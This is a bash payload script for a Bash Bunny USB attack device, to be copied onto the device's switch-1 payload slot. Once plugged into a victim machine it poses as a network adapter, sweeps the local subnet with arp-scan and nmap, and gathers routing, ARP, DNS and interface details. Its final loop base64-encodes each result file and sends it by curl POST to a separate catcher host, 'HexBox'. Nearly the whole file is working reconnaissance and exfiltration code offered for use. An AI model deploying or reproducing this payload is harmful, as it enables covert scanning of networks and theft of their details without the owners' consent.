#!/bin/bash
# bunny_recon.sh — Bash Bunny Switch 1: passive network recon + exfil to HexBox
# Deploy: copy to /root/udisk/payloads/switch1/payload.sh on the Bash Bunny
#
# Attack flow: ECM_ETHERNET → get link → subnet sweep → POST results to HexBox

HEXBOX="10.0.0.99"
HEXBOX_PORT="8000"
LOOT="/tmp/bb_recon"

mkdir -p "$LOOT"

ATTACKMODE ECM_ETHERNET
LED R SOLID

# Wait for DHCP
for _ in $(seq 1 15); do
    GW=$(ip route | awk '/default/{print $3; exit}')
    [ -n "$GW" ] && break
    sleep 1
done

LED R B FAST

SUBNET="${GW%.*}.0/24"

# Host discovery
if command -v arp-scan >/dev/null 2>&1; then
    arp-scan --localnet > "$LOOT/hosts.txt" 2>&1
else
    nmap -sn "$SUBNET" > "$LOOT/hosts.txt" 2>&1
fi

# Port scan top-100
nmap -sS -sV -T4 --top-ports 100 "$SUBNET" \
    -oX "$LOOT/nmap.xml" -oN "$LOOT/nmap.txt" 2>&1

# Routing + ARP table + DNS
ip route            > "$LOOT/network.txt"
arp -n             >> "$LOOT/network.txt"
cat /etc/resolv.conf >> "$LOOT/network.txt"
ip addr            >> "$LOOT/network.txt"

LED R G FAST

# Exfil each file to HexBox catcher /sysinfo
for f in "$LOOT"/*.txt "$LOOT"/*.xml; do
    [ -f "$f" ] || continue
    b64=$(base64 -w0 "$f")
    fname=$(basename "$f" | tr '.' '_')
    curl -s -m 15 -X POST "http://${HEXBOX}:${HEXBOX_PORT}/sysinfo" \
        --data-urlencode "host=BashBunny_${fname}" \
        --data-urlencode "data=${b64}" >/dev/null 2>&1 || true
done

LED G SOLID
sync
